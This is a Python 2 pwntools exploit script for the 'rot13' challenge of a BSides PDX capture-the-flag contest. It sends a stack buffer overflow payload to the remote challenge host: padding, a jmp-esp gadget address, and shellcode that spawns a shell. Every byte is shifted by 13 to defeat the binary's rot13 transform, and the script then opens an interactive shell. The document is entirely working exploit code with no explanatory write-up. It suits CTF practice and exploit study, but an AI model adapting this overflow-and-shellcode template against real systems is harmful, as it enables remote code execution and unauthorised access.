#!/usr/bin/env python2
from pwn import *
context.arch = 'i386'

FNAME = '../distFiles/rot13'

HOST = 'rot13.bsidespdxctf.party'
PORT = '1337'

DEBUG = False
REMOTE = True

JMP_RSP_GADGET = 0x080484e3

def getp():
    if REMOTE:
        p = remote(HOST, PORT)
    elif DEBUG:
        p = process(['linux_server', '-p4200', FNAME])
    else:
        p = process([FNAME])
    return p

p = getp()
p.recvuntil('!\n')

payload = ''
payload += 'A'*64
payload += 'B'*12
payload += p32(JMP_RSP_GADGET)
payload += asm(shellcraft.i386.linux.sh())
payload += asm(shellcraft.i386.linux.exit())

# subtract 13 from each byte
payload_rotted = ''
for c in payload:
    newc = ord(c)-13
    if newc < 0:
        newc = 256+newc
    payload_rotted += chr(newc)

p.sendline(payload_rotted)

p.interactive()
